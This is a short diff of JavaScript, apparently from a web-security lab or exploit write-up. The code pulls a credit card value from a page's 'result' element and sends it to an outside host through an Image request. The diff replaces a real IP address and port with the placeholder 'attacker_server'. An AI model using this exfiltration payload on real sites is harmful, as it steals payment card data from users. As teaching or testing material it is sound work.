@@ -11,7 +11,7 @@ req2.onreadystatechange = function() {
     var htmlPage = req2.responseXML;
     credit_card = htmlPage.getElementById("result").innerHTML;
     document.getElementById("result").innerHTML= credit_card;
-    new Image().src="http://159.89.88.160:9991/card="+credit_card;
+    new Image().src="http://attacker_server/card="+credit_card;
   }
 } 
 req.onreadystatechange = function(){
